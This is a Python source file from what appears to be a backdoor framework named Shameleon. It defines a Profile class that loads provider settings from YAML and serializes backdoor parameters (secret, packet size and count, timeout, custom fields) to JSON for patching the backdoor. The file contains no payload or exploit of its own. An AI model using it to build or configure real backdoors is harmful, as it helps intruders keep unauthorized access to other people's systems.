from __future__ import annotations

import json
from typing import Any

import yaml


class Profile:
    """ Shameleon profile

    Shameleon profile is a YAML file that contains the configuration of a Shameleon provider.
    Shameleon profile is used to configure the Shameleon client and patch the Shameleon backdoor.

    args:
        name: profile name
        provider: Shameleon provider name
        description: profile description
    """

    def __init__(self, name: str, provider: str, description: str = ''):
        self.name = name
        self.provider_name = provider
        self.description = description
        # General config
        self.http_timeout: int = 0
        # Backdoor config
        self.backdoor_secret: str = ''
        self.backdoor_custom: dict[str, Any] = {}
        self.packet_size: int = 0
        self.packet_number: int = 0
        self.backdoor_timeout: int = 0

    @classmethod
    def load(cls, file_path: str) -> Profile:
        with open(file_path, encoding='utf-8') as f:
            data = yaml.safe_load(f)
        profile = cls(
            name=data['general']['name'],
            provider=data['general']['provider'],
            description=data['general']['description'],
        )
        profile.http_timeout = data['general']['http_timeout']
        profile.backdoor_secret = data['backdoor']['secret']
        profile.packet_size = data['backdoor']['packet_size']
        profile.packet_number = data['backdoor']['packet_number']
        profile.backdoor_timeout = data['backdoor']['timeout']
        profile.backdoor_custom = data['backdoor'].get('custom', {})
        return profile

    def serialize_for_backdoor(self) -> str:
        """ Serialize profile for backdoor """
        payload = {
            "delay": 1000,  #  TODO: Implement custom delay
            "secret": self.backdoor_secret,
            "packet_size": self.packet_size,
            "packet_number": self.packet_number,
            "timeout": self.backdoor_timeout,
            "custom": self.backdoor_custom,
        }
        return json.dumps(payload)
